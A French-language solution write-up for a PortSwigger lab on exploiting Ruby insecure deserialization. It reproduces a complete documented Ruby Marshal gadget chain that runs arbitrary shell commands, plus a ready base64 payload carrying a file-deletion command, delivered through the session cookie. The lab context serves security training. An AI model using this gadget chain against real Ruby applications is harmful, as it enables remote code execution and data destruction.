# Lab

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

## Solution

On sait que ce lab utilise Ruby en provoquant une erreur de désérialisation : `index.rb:13:in load&apos;: dump format error(0x52) (ArgumentError) from -e:13:in &lt;main&gt;&apos;`

On peut chercher en ligne pour des gadgets chain pour Ruby. On trouve [celui-ci](https://bishopfox.com/blog/ruby-vulnerabilities-exploits) :

```ruby
Gem::SpecFetcher
Gem::Installer
require "base64"
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end
wa1 = Net::WriteAdapter.new(Kernel, :system)
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "PAYLOAD_HERE")
wa2 = Net::WriteAdapter.new(rs, :resolve)
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)
payload = Marshal.dump({payload: [Gem::SpecFetcher, Gem::Installer, r]})
puts Base64.strict_encode64(payload)
```

En remplacant `PAYLOAD_HERE` par `rm /home/carlos/morale.txt` on obtient le payload suivant :

```
BAh7BjoMcGF5bG9hZFsIYxVHZW06OlNwZWNGZXRjaGVyYxNHZW06Okluc3RhbGxlclU6FUdlbTo6UmVxdWlyZW1lbnRbBm86HEdlbTo6UGFja2FnZTo6VGFyUmVhZGVyBjoIQGlvbzoUTmV0OjpCdWZmZXJlZElPBzsIbzojR2VtOjpQYWNrYWdlOjpUYXJSZWFkZXI6OkVudHJ5BzoKQHJlYWRpADoMQGhlYWRlckkiCGFhYQY6BkVUOhJAZGVidWdfb3V0cHV0bzoWTmV0OjpXcml0ZUFkYXB0ZXIHOgxAc29ja2V0bzoUR2VtOjpSZXF1ZXN0U2V0BzoKQHNldHNvOw8HOxBtC0tlcm5lbDoPQG1ldGhvZF9pZDoLc3lzdGVtOg1AZ2l0X3NldEkiH3JtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0BjsNVDsTOgxyZXNvbHZl
```

Ensuite, on envoie une requête sur la page d'accueil avec le cookie `session` contenant ce payload et le fichier est supprimé.